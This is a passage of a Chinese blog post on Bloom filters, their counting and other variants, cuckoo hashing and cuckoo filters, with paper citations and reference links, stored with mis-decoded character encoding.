äº¿ä¸ªæ­£æ•´æ•°å½“ä¸­ï¼Ÿå‡å¦‚æœºå™¨åªæœ‰ 1G å†…å­˜ï¼Ÿ\n\næˆ‘ä»¬æ¥ä¼°è®¡ä¸€ä¸‹ä¸Šé¢æ‰€éœ€è¦ç”¨åˆ°çš„å†…å­˜ï¼Œ1G çº¦ç­‰äº 10<sup>9</sup> ä¸ªå­—èŠ‚ï¼Œä¸Šé¢çš„æ•°å­—éƒ½æ˜¯ int å‹ï¼Œä¸€ä¸ª int å ç”¨ 4 å­—èŠ‚ï¼Œæ‰€ä»¥é—®é¢˜ä¸€å¯èƒ½éœ€è¦å ç”¨ 4G å†…å­˜ï¼Œæ˜¾ç„¶éœ€è¦çš„å†…å­˜å¤ªå¤§äº†ï¼Œä¼ ç»Ÿçš„æ–¹æ³•æ˜¾ç„¶æ˜¯ä¸èƒ½ç”¨äº†ï¼Œå°±å¯ä»¥ä½¿ç”¨å¸ƒéš†è¿‡æ»¤å™¨\n\n- é¦–å…ˆåˆå§‹åŒ–ä¸€ä¸ª int æ•°ç»„ï¼Œæ¯ä¸ªå…ƒç´ å¯¹åº” 32 ä½æ¯”ç‰¹ï¼ˆint å ç”¨ 4 å­—èŠ‚ï¼Œ1å­—èŠ‚ 8 ä¸ªæ¯”ç‰¹ä½ï¼‰\n- å°† 10 äº¿ä¸ªå…ƒç´ åˆ†åˆ«è¯»å…¥å†…å­˜ï¼Œå¯¹ int æ•°ç»„ä¸­çš„å…ƒç´ æ¯”ç‰¹ä½è¿›è¡Œæ ‡è®°ã€‚å¦‚æœå­˜åœ¨ï¼Œæ ‡è®°ä¸º 1 å³å¯\n- åŸå…ˆä¸€ä¸ª int ç±»å‹åªèƒ½è¡¨ç¤ºä¸€ä¸ªæ•´æ•°ï¼Œç°åœ¨ä¸€ä¸ª int èƒ½è¡¨ç¤º 32 ä¸ªæ•´æ•°ï¼Œç›¸å½“äºæ˜¯èŠ‚çœäº† 32 å€çš„å†…å­˜\n- æ ‡è®°å®Œä¹‹åï¼Œå³å¯å¿«é€Ÿåˆ¤å®šæŸä¸ªå…ƒç´ æ˜¯å¦åœ¨ 10 äº¿ä¸ªæ­£æ•´æ•°å½“ä¸­ï¼Œæ—¶é—´å¤æ‚åº¦ä¸º O(1)\n\n![](/Users/jianjian/jwt1399.github.io/source/images/å¸ƒéš†è¿‡æ»¤å™¨VSå¸ƒè°·é¸Ÿ~/image-20220401105325154.png)\n\n### å‚è€ƒæ–‡ç« \n\n- [Bloom Filters - the math (wisc.edu)](https://pages.cs.wisc.edu/~cao/papers/summary-cache/node8.html)\n- [å¸ƒéš†(Bloom Filter)è¿‡æ»¤å™¨â€”redisé›†æˆå¸ƒéš†è¿‡æ»¤å™¨â€”Javaä½¿ç”¨å¸ƒéš†è¿‡æ»¤å™¨](https://blog.csdn.net/qq_41125219/article/details/119982158)\n- è®ºæ–‡ï¼š[papers of bloom filter - Ying's Blog (izualzhy.cn)](https://izualzhy.cn/bloom-filter-paper#:~:text=Space%2FTime Trade-offs in Hash Coding with Allowable Errors,åœ¨1970å¹´å‘è¡¨çš„æ–‡ç« ï¼Œå¸ƒéš†è¿‡æ»¤å™¨çš„å¼€å±±ä¹‹ä½œã€‚ ç»™å®šä¸€ä¸ª setï¼ŒæŸ¥æ‰¾æŸä¸ª key æ˜¯å¦å­˜åœ¨äºè¯¥ setï¼Œé€šå¸¸è€ƒè™‘ä¸¤ç‚¹ï¼š time%3A æŸ¥æ‰¾æ—¶é—´)\n- [leveldbç¬”è®°ä¹‹9:bloom filter - Ying's Blog (izualzhy.cn)](https://izualzhy.cn/leveldb-bloom-filter)\n- è¯¯æŠ¥ç‡ï¼š[å¸ƒéš†è¿‡æ»¤å™¨åœ¨ä¸€ä¸ªæµ‹è¯•åœºæ™¯ä¸­çš„åº”ç”¨](https://zhuanlan.zhihu.com/p/407540513)\n- è¯¯æŠ¥ç‡ï¼š[å¸ƒéš†è¿‡æ»¤å™¨å‡é˜³ç‡å…¬å¼æ¨å¯¼](https://zhuanlan.zhihu.com/p/397034269)\n- è¯¯æŠ¥ç‡ï¼š[Probabilistic Data structures: Bloom filter | HackerNoon](https://hackernoon.com/probabilistic-data-structures-bloom-filter-5374112a7832)\n- [ç™½è¯å¸ƒéš†è¿‡æ»¤å™¨BloomFilter (bbsmax.com)](https://www.bbsmax.com/A/RnJW3DROJq/)\n- [ã€åˆ†å¸ƒå¼ã€‘Bloom Filter ä¸ Cuckoo Filter - çŸ¥ä¹ (zhihu.com)](https://zhuanlan.zhihu.com/p/131285273)\n- [åˆæ¢å¸ƒéš†è¿‡æ»¤å™¨ - æ˜é‡‘ (juejin.cn)](https://juejin.cn/post/6844903810108751879)\n- [ã€å¤§æ•°æ®ç®—æ³•ã€‘Counting Bloom Filter çš„åŸç†å’Œå®ç° - æ˜é‡‘ (juejin.cn)](https://juejin.cn/post/6844903503815524365)\n- [è¯¦è§£å¸ƒéš†è¿‡æ»¤å™¨çš„åŸç†ï¼Œä½¿ç”¨åœºæ™¯å’Œæ³¨æ„äº‹é¡¹ - çŸ¥ä¹ (zhihu.com)](https://zhuanlan.zhihu.com/p/43263751)\n- [ç»“åˆGuavaæºç è§£è¯»å¸ƒéš†è¿‡æ»¤å™¨ - çŸ¥ä¹ (zhihu.com)](https://zhuanlan.zhihu.com/p/85042394)\n- [ä½¿ç”¨Bloom Filteræ¨¡æ‹Ÿå™¨ï¼Œå¸¦ä½ ä¸€åˆ†é’Ÿäº†è§£å¸ƒéš†è¿‡æ»¤å™¨åŸç†](https://blog.csdn.net/weixin_44930887/article/details/109529519)\n- åœºæ™¯1æ¥æºï¼š[ä¸€ç¯‡æ–‡ç« è¯»æ‡‚å¸ƒéš†è¿‡æ»¤å™¨](https://www.jianshu.com/p/ee1770b748a0)\n- åœºæ™¯2æ¥æºï¼š[å¸ƒéš†è¿‡æ»¤å™¨ï¼ˆBloom Filterï¼‰è¯¦è§£åŠåº”ç”¨ ](https://www.cnblogs.com/zhaodongge/p/15017574.html)\n- è¯¯æŠ¥ç‡è®¡ç®—å™¨ï¼š[Bloom filter calculator (hur.st)](https://hur.st/bloomfilter/)\n- åŠ¨æ€äº¤äº’ï¼š[Bloom Filters by Example (llimllib.github.io)](https://llimllib.github.io/bloomfilter-tutorial/)\n- åŠ¨æ€äº¤äº’ï¼š[Bloom Filters (jasondavies.com)](https://www.jasondavies.com/bloomfilter/)\n- è¯¯æŠ¥ç‡è®¡ç®—å™¨ï¼š[Bloom Filter Calculator (krisives.github.io)](https://krisives.github.io/bloom-calculator/)\n- [æµ·é‡æ•°æ®ä¸‹çš„å»é‡å’ŒæŸ¥é‡ï¼ˆä¸€ï¼‰ï¼šBitMapä½å›¾æ³• ](https://www.jianshu.com/p/8d074e8d02aa)\n- [ä¸ºä»€ä¹ˆæŠ–éŸ³ä»æ¥æ²¡æœ‰é‡å¤å†…å®¹ï¼Ÿ](https://3g.163.com/dy/article/FO0HMBAG0536882Y.html?referFrom=baidu&spss=adap_dy)\n\n## å¸ƒéš†è¿‡æ»¤å™¨å˜ä½“\n\nå¸ƒéš†è¿‡æ»¤å™¨çš„å˜ä½“ååˆ†å¤šï¼Œä¸»è¦æ˜¯ä¸ºäº†è§£å†³å¸ƒéš†è¿‡æ»¤å™¨ç®—æ³•ä¸­çš„ä¸€äº›ç¼ºé™·æˆ–è€…åŠ£åŠ¿ã€‚å¸¸è§çš„å˜ä½“å¦‚ä¸‹ï¼š\n\n| åºå· | å˜ä½“åç§°                       | ç®€ç§°  | å˜ä½“æè¿°                                                     | æ¥æº                                                         | ç­‰çº§(CCF) |\n| ---- | ------------------------------ | ----- | ------------------------------------------------------------ | ------------------------------------------------------------ | --------- |\n| 1    | Counting Bloom Filter          | CBF   | åŠ å…¥Counterï¼Œå®ç°åˆ é™¤æ“ä½œ                                    | [ACM Transactions on Networking](https://ieeexplore.ieee.org/document/851975) | A         |\n| 2    | Accurate Counting Bloom Filter | ACBF  | å°† Counter æ•°ç»„åˆ’åˆ†æˆå¤šä¸ªå±‚çº§ï¼Œæ¥é™ä½è¯¯åˆ¤ç‡                  | [Mathematical Problems in Engineering](https://www.hindawi.com/journals/mpe/2013/516298/) | â€”â€”        |\n| 3    | Dynamic Count  Filter          | DCF   | ä½¿ç”¨ä¸¤ä¸ªæ•°ç»„æ¥å­˜å‚¨æ‰€æœ‰çš„counterï¼Œæ”¹è¿›CBF                     | [SIGMOD Record](https://dl.acm.org/doi/10.1145/1121995.1122000) | â€”â€”        |\n| 4    | Spectral Bloom Filters         | SBF   | CBFçš„æ‰©å±•ï¼Œæä¾›æŸ¥è¯¢é›†åˆå…ƒç´ çš„å‡ºç°é¢‘ç‡åŠŸèƒ½                    | [ACM SIGMOD'03](https://dl.acm.org/doi/10.1145/872757.872787) | A         |\n| 5    | Compressed Bloom Filter        |       | å¯¹ä½æ•°ç»„è¿›è¡Œå‹ç¼©                                             | [ACM Transactions on Networking](https://ieeexplore.ieee.org/document/1041067) | A         |\n| 6    | d-Left Counting Bloom Filter   | dlCBF | è§£å†³å“ˆå¸Œè¡¨çš„è´Ÿè½½å¹³è¡¡é—®é¢˜                                     | [ESA'06](https://dl.acm.org/doi/10.1007/11841036_61)         | B         |\n| 7    | Hierarchical Bloom Filters     | HBF   | åˆ†å±‚ï¼Œç”±å¤šå±‚å¸ƒéš†è¿‡æ»¤å™¨ç»„æˆ                                   | [CCS '04](https://dl.acm.org/doi/proceedings/10.1145/1030083) | A         |\n| 8    | Time-Decaying Bloom Filters    | TDBF  | è®¡æ•°å™¨æ•°ç»„æ›¿æ¢ä½å‘é‡ï¼Œä¼˜åŒ–æ¯ä¸ªè®¡æ•°å™¨å­˜å‚¨å…¶å€¼æ‰€éœ€çš„æœ€å°ç©ºé—´   | [EDBT '13](https://dl.acm.org/doi/10.1145/2452376.2452405)   | B         |\n| 9    | Bloomier Filters               |       | å­˜å‚¨å‡½æ•°å€¼ï¼Œä¸ä»…ä»…æ˜¯åšä½æ˜ å°„                                 | [ACM SODA '04](https://dl.acm.org/doi/10.5555/982792.982797) | A         |\n| 10   | Dynamic Bloom  Filter          | DBF   | æ”¹è¿›SBF                                                      | [IEEE Transactions on Knowledge and Data Engineering](https://ieeexplore.ieee.org/document/4796196) | A         |\n| 11   | Dynamic Bloom Filter Array     | DBA   | DBAåœ¨å¯æ‰©å±•æ€§ã€è¯¯åˆ¤ç‡æ§åˆ¶å’Œå†…å­˜ç©ºé—´æ•ˆç‡ç­‰æ–¹é¢å‡ä¼˜äºç°æœ‰çš„DBFæ–¹æ³•ã€‚ | [IEEE Transactions on Parallel and Distributed Systems](https://ieeexplore.ieee.org/document/6005420) | A         |\n\n###  Counting Bloom Filter(CBF)\n\n**è®ºæ–‡åç§°ï¼šã€ŠSummary cache: a scalable wide-area Web cache sharing protocolã€‹(æ‘˜è¦ç¼“å­˜ï¼šå¯æ‰©å±•çš„å¹¿åŸŸ Web ç¼“å­˜å…±äº«åè®®)**  \n\n- ä½œè€…ï¼šLi Fan; Pei Cao; J. Almeida; A.Z. Broder\n- å•ä½ï¼šCisco Systems\n- åˆŠç‰©ï¼š[ACM Transactions on Networking](https://ieeexplore.ieee.org/document/851975)\n- æ—¶é—´ï¼š2000å¹´06æœˆ\n\n------\n\n#### å¼•å‡º\n\n![](/Users/jianjian/jwt1399.github.io/source/images/å¸ƒéš†è¿‡æ»¤å™¨VSå¸ƒè°·é¸Ÿ~/v2-865983a6709550d9ffa3887c54514a0b_b.jpg)\n\nå‡å¦‚æœ‰è¿™ä¹ˆä¸€ä¸ªæƒ…æ™¯\n\n- æ”¾å…¥æ•°æ®åŒ… 1 æ—¶ï¼Œå°† bitmap çš„ 1ï¼Œ3ï¼Œ6 ä½è®¾ç½®ä¸ºäº† 1\n- æ”¾å…¥æ•°æ®åŒ… 2 æ—¶ï¼Œå°† bitmap çš„ 3ï¼Œ6ï¼Œ7 ä½è®¾ç½®ä¸ºäº† 1\n- æ­¤æ—¶ä¸€ä¸ªå¹¶æ²¡æœ‰å­˜è¿‡çš„æ•°æ®åŒ…è¯·æ±‚ 3ï¼Œåšä¸‰æ¬¡å“ˆå¸Œä¹‹åï¼Œå¯¹åº”çš„ bitmap ä½ç‚¹åˆ†åˆ«æ˜¯ 1ï¼Œ6ï¼Œ7\n- è¿™ä¸ªæ•°æ®ä¹‹å‰å¹¶æ²¡æœ‰å­˜è¿›å»è¿‡ï¼Œä½†æ˜¯ç”±äºæ•°æ®åŒ… 1 å’Œ 2 å­˜å…¥æ—¶å°†å¯¹åº”çš„ç‚¹è®¾ç½®ä¸ºäº†1ï¼Œæ‰€ä»¥ä¹Ÿä¼šè®¤ä¸ºæ•°æ®åŒ… 3 å­˜å…¥äº† bitmap\n- éšç€å­˜å…¥çš„æ•°æ®å¢åŠ ï¼Œå‰é¢çš„ç°è±¡å°±ä¼šè¶Šæ¥è¶Šä¸¥é‡\n\nå¸ƒéš†è¿‡æ»¤å™¨æ²¡æ³•åˆ é™¤æ•°æ®ï¼Œåˆ é™¤æ•°æ®å­˜åœ¨ä»¥ä¸‹ä¸¤ç§å›°å¢ƒï¼š\n\n- 1ã€ç”±äºæœ‰è¯¯åˆ¤çš„å¯èƒ½ï¼Œå¹¶ä¸ç¡®å®šæ•°æ®æ˜¯å¦å­˜åœ¨æ•°æ®åº“é‡Œï¼Œä¾‹å¦‚æ•°æ®åŒ…3\n\n- 2ã€å½“ä½ åˆ é™¤æŸä¸€ä¸ªæ•°æ®åŒ…å¯¹åº”ä½å›¾ä¸Šçš„æ ‡å¿—åï¼Œå¯èƒ½å½±å“å…¶ä»–çš„æ•°æ®åŒ…ï¼Œä¾‹å¦‚ä¸Šé¢ä¾‹å­ä¸­ï¼Œå¦‚æœåˆ é™¤æ•°æ®åŒ…1ï¼Œä¹Ÿå°±æ„å‘³ç€ä¼šå°†  1ï¼Œ3ï¼Œ6 ä½è®¾ç½®ä¸º0ï¼Œæ­¤æ—¶æ•°æ®åŒ… 2 æ¥è¯·æ±‚æ—¶ï¼Œä¼šæ˜¾ç¤ºä¸å­˜åœ¨ï¼Œå› ä¸º 3ï¼Œ6 ä¸¤ä½å·²ç»è¢«è®¾ç½®ä¸º 0 \n\n#### åŸç†\n\nä¸ºäº†è§£å†³ä¸Šé¢å¸ƒéš†è¿‡æ»¤å™¨çš„é—®é¢˜ï¼Œå‡ºç°äº†ä¸€ä¸ªå¢å¼ºç‰ˆçš„å¸ƒéš†è¿‡æ»¤å™¨(Counting Bloom Filter)ï¼Œè¿™ä¸ªè¿‡æ»¤å™¨çš„æ€è·¯æ˜¯å°†å¸ƒéš†è¿‡æ»¤å™¨çš„ bitmap æ›´æ¢æˆæ•°ç»„ï¼Œæ•°ç»„çš„æ¯ä¸€ä½æ‰©å±•ä¸ºä¸€ä¸ªå°çš„è®¡æ•°å™¨(Counter)ï¼Œå½“æ•°ç»„æŸä½ç½®è¢«æ˜ å°„ä¸€æ¬¡æ—¶å°± +1ï¼Œå½“åˆ é™¤æ—¶å°± -1ï¼Œè¿™æ ·å°±é¿å…äº†æ™®é€šå¸ƒéš†è¿‡æ»¤å™¨åˆ é™¤æ•°æ®åéœ€è¦é‡æ–°è®¡ç®—å…¶ä½™æ•°æ®åŒ… Hash çš„é—®é¢˜ï¼Œä½†æ˜¯ä¾æ—§æ²¡æ³•é¿å…è¯¯åˆ¤ã€‚\n\n![](/Users/jianjian/jwt1399.github.io/source/images/å¸ƒéš†è¿‡æ»¤å™¨VSå¸ƒè°·é¸Ÿ~/v2-6cd14beef39ff330a630ca08158814ea_b.jpg)\n\nCounting Bloom Filter é€šè¿‡å¤šå ç”¨å‡ å€çš„å­˜å‚¨ç©ºé—´çš„ä»£ä»·ï¼Œç»™ Bloom Filter å¢åŠ äº†åˆ é™¤æ“ä½œã€‚ä¸‹ä¸€ä¸ªé—®é¢˜è‡ªç„¶å°±æ˜¯ï¼Œåˆ°åº•è¦å¤šå ç”¨å‡ å€å‘¢ï¼Ÿ\n\nç›´æ¥ç»™ç»“è®ºå§ï¼šæ¯ä¸ª Counter åˆ†é… 4 ä½ï¼Œå¯¹äºå¤§å¤šæ•°åº”ç”¨ç¨‹åºæ¥è¯´å°±è¶³å¤Ÿäº†ã€‚è¯¦ç»†è¯æ˜è¿‡ç¨‹å¯ä»¥å»çœ‹è®ºæ–‡\n\n#### å‚è€ƒ\n\n- [Counting Bloom Filter | Programming.Guide](https://programming.guide/counting-bloom-filter.html)\n- [Bloom Filterå’ŒCounting Bloom Filter](https://www.cnblogs.com/the-zym/p/13217986.html)\n- [Counting Bloom Filter](https://blog.csdn.net/jiaomeng/article/details/1498283)\n- [Counting Bloom Filter çš„åŸç†å’Œå®ç°](https://cloud.tencent.com/developer/article/1136056)\n- [å¸ƒéš†è¿‡æ»¤å™¨ä¹‹Counting Bloom Filter](https://sustcoder.github.io/2019/01/11/2019-01-11-bloom-filter/)\n- [Summary Cache: A Scalable Wide-Area Web Cache Sharing Protocol](http://www.cs.wisc.edu/~jussara/papers/00ton.pdf)\n- [å†·é¥­æ–°ç‚’ï¼šç†è§£å¸ƒéš†è¿‡æ»¤å™¨ç®—æ³•çš„å®ç°åŸç† | Throwable (throwx.cn)](https://throwx.cn/2021/08/21/bloom-filter/)\n\n### Accurate Counting Bloom Filter(ACBF)\n\né€šè¿‡ offset indexing çš„æ–¹å¼å°† Counter æ•°ç»„åˆ’åˆ†æˆå¤šä¸ªå±‚çº§ï¼Œæ¥é™ä½è¯¯åˆ¤ç‡ã€‚\n\n[Accurate Counting Bloom Filters for Large-Scale Data Processing](https://www.hindawi.com/journals/mpe/2013/516298/)\n\n###  Dynamic Count  Filter(DCF)\n\nä¸ºæ”¹è¿›SBFçš„ç¼ºç‚¹ï¼Œäººä»¬åˆå‘æ˜äº†DCFï¼ˆDynamic Count Filterï¼‰ï¼Œå…¶ä½¿ç”¨ä¸¤ä¸ªæ•°ç»„æ¥å­˜å‚¨æ‰€æœ‰çš„counterï¼Œå®ƒä»¬çš„é•¿åº¦éƒ½ä¸ºmï¼ˆå³bloom filterçš„ä½æ•°ç»„é•¿åº¦ï¼‰ã€‚ç¬¬ä¸€ä¸ªæ•°ç»„æ˜¯ä¸€ä¸ªåŸºæœ¬çš„CBFï¼ˆå³ä¸‹å›¾ä¸­çš„CBFVï¼Œcounting bloom filter vectorï¼‰ï¼Œcounterçš„é•¿åº¦å›ºå®šï¼Œä¸ºx = log(M/n)ï¼Œå…¶ä¸­Mæ˜¯é›†åˆä¸­æ‰€æœ‰å…ƒç´ çš„ä¸ªæ•°ï¼Œnä¸ºé›†åˆä¸­ä¸åŒå…ƒç´ çš„ä¸ªæ•°ã€‚ç¬¬äºŒä¸ªæ•°ç»„ç”¨æ¥å¤„ç†counterçš„æº¢å‡ºï¼ˆå³ä¸‹å›¾ä¸­çš„OFVï¼Œoverflow vectorï¼‰ï¼Œæ•°ç»„æ¯ä¸€é¡¹çš„é•¿åº¦å¹¶ä¸å›ºå®šï¼Œæ ¹æ®counterçš„æº¢å‡ºæƒ…å†µåŠ¨æ€è°ƒæ•´ã€‚\n\n\n[Dynamic count filters | ACM SIGMOD Record](https://dl.acm.org/doi/10.1145/1121995.1122000)\n\n[è®¡æ•°å¼å¸ƒéš†è¿‡æ»¤å™¨](https://blog.csdn.net/vipshop_fin_dev/article/details/102647115)\n\n[ Dynamic Count Filter](https://blog.csdn.net/jiaomeng/article/details/1543751)\n\n### Compressed Bloom Filter\n\n[Compressed bloom filters - Networking, IEEE/ACM Transactions on (harvard.edu)](http://www.eecs.harvard.edu/~michaelm/postscripts/ton2002.pdf)\n\n### Spectral Bloom Filter(SBF)\n\nSaar Cohen, Yossi Matias 2003.6\n\n[SIGMOD '03: Proceedings of the 2003 ACM SIGMOD international conference on Management of data](https://dl.acm.org/doi/proceedings/10.1145/872757)\n\nåœ¨ CBF çš„åŸºç¡€ä¸Šæå‡ºäº†å…ƒç´ å‡ºç°é¢‘ç‡æŸ¥è¯¢çš„æ¦‚å¿µï¼Œå°†CBFçš„åº”ç”¨æ‰©å±•åˆ°äº† multi-set çš„é¢†åŸŸï¼›\n\n[sbf-sigmod-03.pdf (stanford.edu)](http://theory.stanford.edu/~matias/papers/sbf-sigmod-03.pdf)\n\n### d-Left Counting Bloom Filter(dlCBF)\n\nåˆ©ç”¨ d-left hashing çš„æ–¹æ³•å­˜å‚¨ fingerprintï¼Œè§£å†³å“ˆå¸Œè¡¨çš„è´Ÿè½½å¹³è¡¡é—®é¢˜ï¼›\n\n[An improved construction for counting bloom filters | Proceedings of the 14th conference on Annual European Symposium - Volume 14 (acm.org)](https://dl.acm.org/doi/10.1007/11841036_61)\n\n## å¸ƒè°·é¸Ÿå“ˆå¸Œ\n\n### å¼•å‡º\n\nå“ˆå¸Œçš„æœ¬è´¨æ˜¯ä»**ä¸€ä¸ªè¾ƒå¤§ç©ºé—´æ˜ å°„**åˆ°**ä¸€ä¸ªè¾ƒå°çš„ç©ºé—´**ï¼Œå› æ­¤åœ¨æ’å…¥æ•°æ®è¶³å¤Ÿå¤šä¹‹åï¼Œæ ¹æ®**é¸½å·¢åŸç†**ï¼Œ**ä¸€å®šä¼šå­˜åœ¨ä½ç½®å†²çª**ã€‚å¸¸è§çš„å“ˆå¸Œè¡¨ï¼ˆHash Table æˆ–è€… dictionaryï¼‰ä¼šé€šè¿‡**é“¾è¡¨**ã€**å¼€æ”¾åœ°å€æ¢æµ‹**ç­‰æ–¹å¼æ¥å¤„ç†å†²çªã€‚\n\nå•æ¡¶å¤šå‡½æ•°çš„å¸ƒè°·é¸Ÿå“ˆå¸Œï¼Œä¾¿æ˜¯å¼€æ”¾åœ°å€æ³•å¤„ç†å†²çªçš„ä¸€ç§å“ˆå¸Œè¡¨ï¼Œåªä¸è¿‡æœ‰å†²çªåï¼Œä¸æ˜¯é€šè¿‡çº¿æ€§å¯»æ‰¾æ–°çš„ä½ç½®ï¼Œè€Œæ˜¯é€šè¿‡é¢å¤–å“ˆå¸Œå‡½æ•°æ¥å¯»æ‰¾ã€‚Cuckoo Hashing æ˜¯ä¸€ç§é¸ å é¹Šå·¢çš„ç­–ç•¥ã€‚\n\n### åŸç†\n\n**è®ºæ–‡åç§°ï¼šã€ŠCuckoo Hashingã€‹**â€”â€”`è¯¥ç¯‡è®ºæ–‡æ˜¯å¸ƒè°·é¸Ÿå“ˆå¸Œçš„å¼€å±±ä¹‹ä½œ`\n\n- ä½œè€…ï¼šRasmus Paghaï¼ŒFlemming Friche Rodlerb\n- å•ä½ï¼šAarhus University\n- åˆŠç‰©ï¼š[ACM Journal of Algorithms](https://www.di.ens.fr/~vergnaud/algo0910/Cuckoo.pdf)\n- æ—¶é—´ï¼š2004å¹´05æœˆ\n\n------\n\nåŸºæœ¬æ€æƒ³ï¼šä½¿ç”¨`ä¸¤ä¸ªå“ˆå¸Œå‡½æ•° h1ã€h2` å’Œ`ä¸¤ä¸ªå“ˆå¸Œæ¡¶ T1ã€T2`ï¼Œ å¯¹ä¸€ä¸ª `key` è¿›è¡Œå“ˆå¸Œï¼Œå¾—åˆ°æ¡¶ä¸­çš„ä¸¤ä¸ªä½ç½®\n\n- å¦‚æœä¸¤ä¸ªä½ç½®éƒ½ä¸ºç©ºï¼Œéšä¾¿é€‰ä¸€ä¸ªæ’å…¥ key\n- å¦‚æœåªæœ‰ä¸€ä¸ªä½ç½®ä¸ºç©ºï¼Œåˆ™å­˜å…¥ä¸ºç©ºçš„ä½ç½®\n- å¦‚æœéƒ½ä¸ä¸ºç©ºï¼Œåˆ™éšæœºè¸¢å‡ºä¸€ä¸ªå…ƒç´ \n- è¸¢å‡ºçš„å…ƒç´ ï¼Œé‡å¤ä¸Šè¿°è¿‡ç¨‹ï¼Œæ’å…¥å…ƒç´ \n\nå½“ç„¶å‡å¦‚å­˜åœ¨ç»å¯¹çš„ç©ºé—´ä¸è¶³ï¼Œé‚£è€æ˜¯è¸¢å‡ºä¹Ÿä¸æ˜¯åŠæ³•ï¼Œæ‰€ä»¥ä¸€èˆ¬ä¼šè®¾ç½®ä¸€ä¸ª**è¸¢å‡ºé˜ˆå€¼**ï¼Œå¦‚æœåœ¨æŸæ¬¡æ’å…¥è¡Œä¸ºè¿‡ç¨‹ä¸­è¿ç»­è¸¢å‡ºï¼Œåˆ™è¯´æ˜å“ˆå¸Œæ¡¶æ»¡äº†ï¼Œè¶…è¿‡é˜ˆå€¼ï¼Œåˆ™è¿›è¡Œæ‰©å®¹ã€‚\n\n- p1 = hash1(x) % L\n- p2 = hash2(x) % L\n\n![](https://img.jwt1399.top/img/ifWcXxkJCNYbuph.png)\n\n### å˜ç§\n\nå¸ƒè°·é¸Ÿå“ˆå¸Œå¯ä»¥æœ‰å¾ˆå¤šå˜ç§ï¼Œæ¯”å¦‚ï¼š\n\n1. ä½¿ç”¨**ä¸¤ä¸ª**å“ˆå¸Œå‡½æ•°å’Œ**ä¸€ä¸ª**å“ˆå¸Œæ¡¶ã€‚\n2. ä½¿ç”¨**ä¸¤ä¸ª**å“ˆå¸Œå‡½æ•°å’Œ**å››è·¯**å“ˆå¸Œæ¡¶ã€‚\n\n![](https://img.jwt1399.top/img/1617168-20210727195625561-1153589445.jpg)\n\nå¯ä»¥è¯æ˜ï¼Œåè€…çš„æ¡¶çš„åˆ©ç”¨ç‡ä¼šæ›´é«˜ï¼Œåé¢è®²å¸ƒè°·é¸Ÿè¿‡æ»¤å™¨ä¼šç»†è¯´åŸå› \n\n## å¸ƒè°·é¸Ÿè¿‡æ»¤å™¨\n\n**è®ºæ–‡åç§°ï¼šã€ŠCuckoo Filter: Practically Better Than Bloomã€‹(å¸ƒè°·é¸Ÿè¿‡æ»¤å™¨ï¼šå®é™…ä¸Šæ¯”å¸ƒéš†è¿‡æ»¤å™¨æ›´å¥½)** â€”â€”`è¯¥ç¯‡è®ºæ–‡æ˜¯å¸ƒè°·é¸Ÿéš†è¿‡æ»¤å™¨çš„å¼€å±±ä¹‹ä½œ`\n\n- ä½œè€…ï¼šBin Fan, Dave G. Andersen, Michael Kaminsky, Michael D. Mitzenmacher\n- å•ä½ï¼šå¡å†…åŸºæ¢…éš†å¤§å­¦\n- åˆŠç‰©ï¼š[CoNEXT '14](https://dl.acm.org/doi/10.1145/2674005.2674994)ã€CCF Bã€‘\n- æ—¶é—´ï¼š2014å¹´12æœˆ\n- ä¸»è¦å†…å®¹ï¼šæˆ‘ä»¬`æå‡ºäº†ä¸€ç§ç§°ä¸ºå¸ƒè°·é¸Ÿæ»¤æ³¢å™¨çš„æ–°æ•°æ®ç»“æ„`ï¼Œå®ƒå¯ä»¥å–ä»£ Bloom è¿‡æ»¤å™¨è¿›è¡Œè¿‘ä¼¼é›†åˆæŸ¥è¯¢æµ‹è¯•ã€‚å¸ƒè°·é¸Ÿè¿‡æ»¤å™¨**æ”¯æŒåŠ¨æ€æ·»åŠ å’Œåˆ é™¤å…ƒç´ **ï¼ŒåŒæ—¶å®ç°æ¯” Bloom è¿‡æ»¤å™¨**æ›´é«˜çš„æ€§èƒ½**ã€‚å¯¹äºå­˜å‚¨è®¸å¤šé¡¹ç›®å¹¶é’ˆå¯¹ä¸­ç­‰ä½è¯¯æŠ¥ç‡çš„åº”ç”¨ç¨‹åºï¼Œå¸ƒè°·é¸Ÿè¿‡æ»¤å™¨çš„**ç©ºé—´å¼€é”€**ä½äºç©ºé—´ä¼˜åŒ–çš„ Bloom è¿‡æ»¤å™¨ã€‚\n\n------\n\nè®ºæ–‡ç›´æ¥è¯´åˆ°å¸ƒéš†è¿‡æ»¤å™¨çš„ç¼ºç‚¹ï¼š\n\n- Bloomè¿‡æ»¤å™¨çš„ä¸€ä¸ªé™åˆ¶æ˜¯ï¼šåœ¨ä¸é‡æ–°æ„å»ºæ•´ä¸ªè¿‡æ»¤å™¨çš„æƒ…å†µä¸‹ï¼Œä¸èƒ½åˆ é™¤ç°æœ‰é¡¹ã€‚\n\nè®ºæ–‡ä¸­ä¹Ÿæåˆ°äº†å¸ƒè°·é¸Ÿè¿‡æ»¤å™¨ 4 å¤§ä¼˜ç‚¹ï¼š\n\n- 1ã€æ”¯æŒåŠ¨æ€çš„æ–°å¢å’Œåˆ é™¤å…ƒç´ ï¼›\n- 2ã€æä¾›äº†æ¯”ä¼ ç»Ÿå¸ƒéš†è¿‡æ»¤å™¨æ›´é«˜çš„æŸ¥æ‰¾æ€§èƒ½ï¼Œå³ä½¿åœ¨æ¥è¿‘æ»¡çš„æƒ…å†µä¸‹ï¼ˆæ¯”å¦‚ç©ºé—´åˆ©ç”¨ç‡è¾¾åˆ° 95% çš„æ—¶å€™ï¼‰ï¼›\n- 3ã€ç›¸æ¯”å…¶ä»–æ”¯æŒåˆ é™¤çš„ Filter æ›´å®¹æ˜“å®ç°ï¼›\n- 4ã€å¦‚æœè¦æ±‚è¯¯åˆ¤ç‡å°äº3%ï¼Œé‚£ä¹ˆåœ¨è®¸å¤šå®é™…åº”ç”¨ä¸­ï¼Œå®ƒæ¯”å¸ƒéš†è¿‡æ»¤å™¨å ç”¨çš„ç©ºé—´æ›´å°ã€‚\n\nä¸ºäº†è¾¾åˆ°ä»¥ä¸Šæ•ˆæœï¼ŒCuckoo Filter å¯¹åŸ Cuckoo Hash åšäº†å¦‚ä¸‹æ”¹å˜ï¼š\n\n1. ä¸ºäº†æé«˜æ¡¶çš„åˆ©ç”¨ç‡ï¼Œä½¿ç”¨å¤šè·¯å“ˆå¸Œæ¡¶ã€‚\n2. ä¸ºäº†å‡å°‘å†…å­˜çš„ä½¿ç”¨ï¼Œåªå­˜å‚¨ key æŒ‡çº¹ã€‚\n\n### 